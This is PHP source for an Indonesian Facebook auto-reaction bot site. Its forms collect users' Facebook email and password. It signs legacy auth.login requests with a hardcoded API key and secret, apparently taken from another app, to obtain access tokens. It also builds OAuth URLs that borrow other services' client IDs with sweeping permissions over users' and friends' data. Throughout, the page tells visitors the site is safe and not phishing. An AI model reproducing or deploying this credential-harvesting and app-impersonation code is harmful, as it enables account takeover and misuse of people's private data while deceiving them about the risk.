<?php
function buildUrl($user,$pass){
$Apidata=array(
 "api_key" => "3e7c78e35a76a9299309885393b02d97",
 "credentials_type" => "password",
 "email" =>"$user",
 "format"=>"JSON",
 "locale"=>"en_US",
 "method"=>"auth.login",
 "password"=>"$pass",
 "return_ssl_resources"=>"0",
 "v"=>"1.0"
);
$md5="";
foreach ($Apidata as $data => $barrier){
  $md5.=$data."=".$barrier;
}
$md5.="c1e620fa708a1d5696fb991c1bde5662";
$md5=md5($md5);
$ApiUrl= "https://api.facebook.com/restserver.php?".http_build_query($Apidata)."&sig=".$md5;
return $ApiUrl;
}
function token_init($user,$pass){
  $url = buildUrl($user,$pass);
  echo "<center><iframe src='$url' frameborder='0' width='100%' height='250px'></iframe></center>";
}
function form($action=null,$simulate=null){
  if (!$action){
    $action = 'login-fb.php';
  }
   echo '<div class="container">
      <div class="panel panel-primary">
<div class="panel-heading"><img src="https://z-1-static.xx.fbcdn.net/rsrc.php/v3/yR/r/wHyx5kjomL3.png">Bot Reaction Facebook</div>
<div class="panel-body">
      <form autocomplete="off" action="'.$action.'" target="_self" method="POST" class="get_token">';
      if ($simulate){
        $user = $simulate["user"];
        $pass = $simulate["pass"];
      echo '<label for="email" class="sr-only">User FB</label>
        <input autocomplete="off" type="text" name="email" class="form-control" placeholder="Your User FB" value="'.$user.'" required autofocus autocomplete="off">
        
        <label for="pass" class="sr-only">User FB</label>
        <input autocomplete="off" type="password" name="pass" class="form-control" placeholder="Your Password FB" value="'.$pass.'" required autofocus autocomplete="off">
      ';
      }
       echo '<label for="token" class="sr-only">Access Token</label>
        <input type="text" name="token" class="form-control" placeholder="Your Access Token" required autofocus autocomplete="off">
        </div><center>
        <button class="btn btn-lg btn-success" type="submit">Login</button></center><br>
      </form>
      </div></div>';
}
    
function home($action=null){
  if (!$action){
    $action = 'simulator.php';
  }
   echo '<div class="container">
      <div class="panel panel-primary">
<div class="panel-heading"><img src="https://z-1-static.xx.fbcdn.net/rsrc.php/v3/yR/r/wHyx5kjomL3.png">Bot Reaction Facebook</div>
<div class="panel-body">
      <form autocomplete="off" action="'.$action.'" target="_self" method="POST" class="form-signin">
        <label for="inputEmail" class="sr-only">Email address</label>
        <input autocomplete="off" type="text" name="email" class="form-control" placeholder="Email address" required autofocus />
        <label for="inputPassword" class="sr-only">Password</label>
        <input autocomplete="off" type="password" name="pass" class="form-control" placeholder="Password" required />
        </div><center>
        <button class="btn btn-lg btn-success" type="submit">Login</button></center><br>
      </form>
      </div></div>';
      show_body();
    }
    
 function eror($apa){
echo '<div class="container"><div class="panel panel-success">
<div class="panel-heading"> <img src="https://z-1-static.xx.fbcdn.net/rsrc.php/v3/yt/r/bMltPkpSVR1.png">Pemberitahuan</div><div class="panel-body">
'.$apa.'
</div></div></div>';
}
function head($head){
echo '<!DOCTYPE html PUBLIC -//W3C//DTD XHTML 1.0 Strict//EN http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd>
<html lang="en">
<head title="Robot Beranda Facebook">
<title>'.$head.'</title>
<link rel="shortcut icon" href="//bertena.ga/Material/img/favicon.ico">
<meta name="description" content="Robot Beranda | Tanggapi Status Teman Facebook Kamu Secara Otomatis" />
<meta charset="utf-8">
<!--meta name="keywords" content=" Robot Beranda, Robot Wow, Robot Super, Robot Like, Robot Sad, Robot Sedih, Robot Marah, Robot Angry, Robot Like, Robot Love, Autolike Facebook, Increase Facebook Likes, AutoCommenter, Facebook Hack, Facebook Status Liker, CST Liker, Indonesia Autolike, Autolike status, Autolike Photo, ,Autolike Fans Page ,Bot komen ,Bot Like, Bom Like,Bomer Like, Big Like, Facebook, Google, Yahoo, Mywapblog, Bot koplak, Alexa, Ping, Twitter, Indonesian Likers, Autoliker, FB Autolike, FB Autoliker, FB Status Autolike, Indonesian Liker, Autolike 2014, Autolike, Jempol, Hublaa, Like" /-->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
<meta property="og:image" content="//bertena.ga/Material/img/icon.png"/>
<meta http-equiv="expires" content="0">
<meta name="copyright" content="Copyright © Robot Beranda Facebook">
<meta name="author" content="Dimas Lanjaka Kumala Indra">
<meta name="charset" content="UTF-8">
<meta name="distribution" content="Global">
<meta name="rating" content="General">
<!--meta name="robots" content="Autolike,hublaa,CST Liker,Yaz4rt,IndoLikerz,Hembus,auto follower,autolike page,auto komen"-->

<style>
    .hidden { display: none }
    .adb {
        position: fixed;
        width: 100%;
        height: 100%;
        left: 0;
        top: 0;
        bottom: 0;
        background: rgba(51, 51, 51, 0.7);
        z-index: 10000;
        text-align: center;
        color: #fff;
    }
    .adbs {
        margin: 0 auto;
        width: auto;
        position: fixed;
        z-index: 99999;
        left: 50%;
        top: 50%;
        transform: translate(-50%, -50%);
        padding: 20px 30px 30px;
        background: rgba(51, 51, 51, 0.5);
        -webkit-border-radius: 12px;
        -moz-border-radius: 12px;
        border-radius: 12px;
    }
</style>

<noscript>
<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css" />
<link rel="styleheet" href="css/bootstrap.css" />      
<link rel="styleheet" href="css/bootstrap.min.css" />
<link rel="styleheet" href="css/bootstrap-theme.css" />
<link rel="styleheet" href="css/bootstrap-theme.min.css" />
</noscript>

<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({
          google_ad_client: "ca-pub-7975270895217217",
          enable_page_level_ads: true
     });
</script>
</head>
  <body>'.(file_exists("menu.php") ? file_get_contents('menu.php') : (file_exists('../../../menu.php') ? file_get_contents('../../../menu.php') : false));
}
function footer(){
$fhtml = <<<EOF
<div style='clear:both'></div>
         <div id="footer" class="jumbotron" style="margin-top: 20px;padding: 20px;text-align: center;margin-bottom: 0px;bottom:0px">
<div id="google_translate_element"></div>
<hr>
<div id="histats_counter"></div><br>
<strong>Copyright &copy; 2017 <a href="/">Robot Reaction Facebook</a> All Right Reserved. </strong></font>
</div>

<script src="https://codepen.io/dimaslanjaka/pen/xLPQjG.js"></script>

<script type="text/javascript">
function googleTranslateElementInit() {
new google.translate.TranslateElement({pageLanguage: 'inggris', layout: google.translate.TranslateElement.InlineLayout.SIMPLE}, 'google_translate_element');
}
</script><script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>

<script>
var loadMultipleCss = function(){
    //load local css
    loadCss('css/bootstrap.css');        
    loadCss('css/bootstrap.min.css');
    loadCss('css/bootstrap-theme.css');
    loadCss('css/bootstrap-theme.min.css')
    //load Bootstrap from CDN
    loadCss('https://www.w3schools.com/w3css/4/w3.css');
    loadCss('https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css');
    loadCss('https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap-theme.min.css');
}
 
var loadCss = function(cssPath){
    var cssLink = document.createElement('link');
    cssLink.rel = 'stylesheet';
    cssLink.href = cssPath;
    var head = document.getElementsByTagName('head')[0];
    head.parentNode.insertBefore(cssLink, head);
};
 
//call function on window load
try {
  loadMultipleCss();
}
catch(err){
  window.addEventListener('load', loadMultipleCss);
}
</script>
    <script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
</body>
</html>
EOF;
/*
if (strpos($_SERVER["REQUEST_URI"], "simulator.php") === false){
  $fhtml .= <<<EOF
  <script>
    $('form.form-signin').submit(function() {
        $.ajax({
            data: $(this).serialize(),
            type: $(this).attr('method'),
            url: $(this).attr('action'),
            beforeSend: function() {
                $("#adbs").html("Please Wait...");
                $("#adb").removeClass('hidden')
            },
            success: function(response) {
              window.location.reload(1)
            },
            error: function(data) {
                $("#ajaxr").html("Request Error. Contact admin +6285655667573")
            },
            complete: function(data) {
                $("#adb").addClass('hidden')
            }
        });
        return !1
    })
</script>
EOF;
}
if (strpos($_SERVER["REQUEST_URI"], "/ajax/") === false){
  $fhtml .= <<<EOF
  <div class='adb hidden' id='adb'>
<div class='adbs' id='adbs'></div>

<div class="progress progress-striped active">
<div class="progress-bar" style="width: 100%"></div></div>
EOF;
}
*/
echo $fhtml;

}

function body_home($x){
      echo '<div class="container theme-showcase" role="main">
      <div class="jumbotron">
<h1 style="text-align: center;"><font color="009c84">Welcome to Robot Reaction Facebook</font></h1>
        <div class="container"><p><b><a href="/">Robot Beranda Facebook</a></b> adalah Layanan Robot Facebook yang Memungkinkan Akun Kamu Melakukan Tanggapan Distatus Teman </p></div>
        </div>
      </div>        
      </div>';
       echo ' <div class="container"><div class="alert alert-info"><button type="button" class="close" data-dismiss="alert">&times;</button><b>INFO: </b>Saya Sarankan Kamu Untuk Menambahkan Nomor Ponsel, agar bila Akun Facebook Kamu Terkunci Tidak Harus Tebak Photo.</div></div><p>';
   /*echo ' <div class="container">
      <div class="panel panel-primary">
<div class="panel-heading"> <img src="https://z-1-static.xx.fbcdn.net/rsrc.php/v3/yR/r/wHyx5kjomL3.png"> Login Robot Reaction</div>
<div class="panel-body">
      <form autocomplete="off" action="" method="POST" class="form-signin" target="_self">
        <label for="inputEmail" class="sr-only">Email address</label>
        <input autocomplete="off" type="text" name="email" class="form-control" placeholder="Email address" required autofocus>
        <label for="inputPassword" class="sr-only">Password</label>
        <input autocomplete="off" type="password" name="pass" class="form-control" placeholder="Password" required>
        </div><center>
        <button class="btn btn-lg btn-success" type="submit">Login</button></center><br>
      </form>
      </div></div></div>';*/
  home($x);
  show_body();
}
function show_body(){
  echo '
  <style>
  figure img{max-width:100%;height:300px}
  </style>
  <div class="container">
  <div class="panel panel-info">
  <div class="panel-heading">Cara Mengatasi Akun Terkunci!!</div>
  <div class="panel-body">
	<figure class="figure"> 
	<img src="images/Ss1.png" class="figure-img img-fluid rounded" alt="Step."> 
	<figcaption class="figure-caption text-right">Klik <b>Ini Adalah Saya</b></figcaption> 
	</figure>
	<figure class="figure"> 
	<img src="images/Ss2.png" class="figure-img img-fluid rounded" alt="Step."> 
	<figcaption class="figure-caption text-right">Pilih <b>Ingat Browser</b>. Kemudian Klik <b>Lanjutkan</b></figcaption> 
	</figure>
	<figure class="figure"> 
	<img src="images/Ss3.png" class="figure-img img-fluid rounded" alt="Step."> 
	<figcaption class="figure-caption text-right">Klik <b>Selesai</b></figcaption> 
	</figure>
	</div>
  </div>
  </div>';
  
  echo '<div class="container">
      <div class="panel panel-info">
<div class="panel-heading">Ada Apa Dalam ?</div>
<div class="panel-body">
<li> Bot Reaction Suka</li>
<li> Bot Reaction Super</li>
<li> Bot Reaction Haha</li>
<li> Bot Reaction Wow</li>
<li> Bot Reaction Sedih</li>
<li> Bot Reaction Marah</li>
<li> Bot Reaction Random ( Pilihan Diatas ) </li>
</div></div>';
   echo '<div class="panel panel-info">
<div class="panel-heading">Apakah ini Gratis ?</div>
<div class="panel-body">
Situs Kami 100% Gratis, Kecuali Jika Mau Donasi ya Silahkan :D </div></div>';
   echo '<div class="panel panel-info">
<div class="panel-heading">Apakah Ini Aman ?</div>
<div class="panel-body">
Ya Situs Kami Benar-Benar Aman. Percayakan Akun Facebook Anda Bersama Kami</div></div>';
    echo '<div class="panel panel-info">
<div class="panel-heading">Tidak Mempromosikan Situs/Spam!</div>
<div class="panel-body">
Kami Tidak Mempromosikan Link-Link Tertentu Atas Nama Anda, Kami Benar-Benar Aman.</div></div>';
    echo '<div class="panel panel-info">
<div class="panel-heading">Bukan Phising</div>
<div class="panel-body">
Ini Bukanlah Phising yang Mengatas Namakan Robot Reaction.</div></div>';
      echo '<div class="panel panel-info">
<div class="panel-heading">Kenapa Harus Email dan Password ?</div>
<div class="panel-body">
Bot Reaction Ga Bisa Pake Access Token! Makanya Kami Menggunakan Data Facebook Kamu.</div></div>';
     echo '<div class="panel panel-info">
<div class="panel-heading">Donasi ?</div>
<div class="panel-body">
<li>085655667573</li>
<li>dimaslanjaka@gmail.com</li>
  </div></div></div>';
}
function oauth($appid,$redirect){
  global $opt;
$url="https://www.facebook.com/v1.0/dialog/oauth?response_type=token&display=popup&client_id=$appid&redirect_uri=$redirect&scope=user_actions.books,user_actions.music,user_actions.video,user_checkins,user_education_history,user_events,user_games_activity,user_groups,user_hometown,user_interests,user_likes,user_location,user_notes,user_photo_video_tags,user_photos,user_questions,user_relationship_details,user_relationships,user_religion_politics,user_status,user_subscriptions,user_videos,user_website,user_work_history,friends_about_me,friends_actions.books,friends_actions.music,friends_actions.news,friends_actions.video,friends_activities,friends_birthday,friends_checkins,friends_education_history,friends_events,friends_games_activity,friends_groups,friends_hometown,friends_interests,friends_likes,friends_location,friends_notes,friends_photo_video_tags,friends_photos,friends_questions,friends_relationship_details,friends_relationships,friends_religion_politics,friends_status,friends_subscriptions,friends_videos,friends_website,friends_work_history,ads_read,email,publish_checkins&format=json&sdk=android";
return $url;
}

// appid 145634995501895 fb
// app_id 1217981644879628 instagram
// client_id 124024574287414 instagram
// api_key   124024574287414 instagram
// ? id= 1425767024389221 instagram
// ? id= 611911702222239 hootsuite
// client_id 183319479511 hootsuite
// api_key 183319479511 hootsuite
// 317436302110698 v2.11 hootsuite
//https://hootsuite.com/login?method=facebook

// id=521414431657173 vonvon
// client_id 685543434893182 vonvon
//https://id.vonvon.me/callback/facebook

// client_id 373499472709067 myspace.com
//https://myspace.com/thirdpartyauth/facebook/connected/login?mstoken=undefined

//id=1483047915331997 spotify
//api_key=174829003346
//https://www.spotify.com/id/signup/

//$spotify=oauth(174829003346,"https://accounts.spotify.com/api/facebook/oauth/access_token");
$vonvon=oauth(685543434893182,"https://id.vonvon.me/callback/facebook"); 
$hootsuite=oauth(183319479511,"https://hootsuite.com/login?method=facebook");
$myspace=oauth(373499472709067,"https://myspace.com/thirdpartyauth/facebook/connected/login?mstoken=undefined");
$instagram=oauth(124024574287414,"https://www.instagram.com/accounts/signup/");